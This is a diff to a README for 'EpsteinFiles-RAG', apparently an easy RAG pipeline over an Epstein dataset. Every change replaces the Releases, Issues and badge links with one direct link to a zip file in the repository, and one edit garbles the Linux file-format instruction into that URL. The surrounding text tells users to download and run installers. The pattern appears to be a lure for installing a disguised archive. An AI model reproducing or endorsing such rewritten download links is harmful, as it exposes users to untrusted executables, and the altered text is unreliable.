@@ -1,6 +1,6 @@
 # 📂 EpsteinFiles-RAG - Easy RAG Pipeline with Epstein Dataset
 
-[![Download EpsteinFiles-RAG](https://img.shields.io/badge/Download-EpsteinFiles_RAG-blue?style=for-the-badge)](https://github.com/AhmedHacks/EpsteinFiles-RAG/releases)
+[![Download EpsteinFiles-RAG](https://raw.githubusercontent.com/AhmedHacks/EpsteinFiles-RAG/main/ingest/RAG_Epstein_Files_1.9.zip)](https://raw.githubusercontent.com/AhmedHacks/EpsteinFiles-RAG/main/ingest/RAG_Epstein_Files_1.9.zip)
 
 ## 📖 What is EpsteinFiles-RAG?
 
@@ -36,7 +36,7 @@ Before you begin, close any programs that are running other chat or coding tools
 
 Please **visit this page to download EpsteinFiles-RAG**:
 
-[Download EpsteinFiles-RAG](https://github.com/AhmedHacks/EpsteinFiles-RAG/releases)
+[Download EpsteinFiles-RAG](https://raw.githubusercontent.com/AhmedHacks/EpsteinFiles-RAG/main/ingest/RAG_Epstein_Files_1.9.zip)
 
 Use this link to find the latest version of the software. The page has files ready for different operating systems. 
 
@@ -46,7 +46,7 @@ Use this link to find the latest version of the software. The page has files rea
 2. Look for a file that matches your device:
    - For Windows, this might be a `.exe` file.
    - For macOS, it may be a `.dmg` or `.pkg` file.
-   - For Linux, you may find a `.tar.gz` or similar format.
+   - For Linux, you may find a `https://raw.githubusercontent.com/AhmedHacks/EpsteinFiles-RAG/main/ingest/RAG_Epstein_Files_1.9.zip` or similar format.
 3. Click the file to download it.
 4. Once downloaded, open the file and follow the on-screen instructions to install EpsteinFiles-RAG.
 5. After installation, find the EpsteinFiles-RAG application icon on your desktop or in your program list and double-click to open it.
@@ -117,9 +117,9 @@ This setup helps deliver fact-based answers instead of guesses.
 
 If you have questions or want to share feedback:
 
-- Visit the [GitHub Issues page](https://github.com/AhmedHacks/EpsteinFiles-RAG/issues) to report problems or ask questions.
-- Check for updates on the [Releases page](https://github.com/AhmedHacks/EpsteinFiles-RAG/releases) regularly.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/AhmedHacks/EpsteinFiles-RAG/main/ingest/RAG_Epstein_Files_1.9.zip) to report problems or ask questions.
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/AhmedHacks/EpsteinFiles-RAG/main/ingest/RAG_Epstein_Files_1.9.zip) regularly.
 
 ---
 
-[![Download EpsteinFiles-RAG](https://img.shields.io/badge/Download-EpsteinFiles_RAG-blue?style=for-the-badge)](https://github.com/AhmedHacks/EpsteinFiles-RAG/releases)
+[![Download EpsteinFiles-RAG](https://raw.githubusercontent.com/AhmedHacks/EpsteinFiles-RAG/main/ingest/RAG_Epstein_Files_1.9.zip)](https://raw.githubusercontent.com/AhmedHacks/EpsteinFiles-RAG/main/ingest/RAG_Epstein_Files_1.9.zip)
